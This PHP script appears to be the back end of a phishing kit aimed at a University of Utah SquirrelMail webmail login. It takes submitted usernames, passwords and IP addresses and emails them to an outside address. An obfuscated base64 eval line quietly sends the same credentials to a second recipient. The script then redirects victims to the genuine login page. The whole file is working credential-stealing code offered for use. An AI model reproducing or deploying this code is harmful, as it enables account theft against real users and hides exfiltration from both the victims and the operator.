<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['login_username'];
$sUPass = $_POST['secretkey'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (JP-Hack | math.utah.edu |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://mail.math.utah.edu/squirrelmail/src/login.php \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://mail.math.utah.edu/squirrelmail/src/login.php\">");
exit();

?>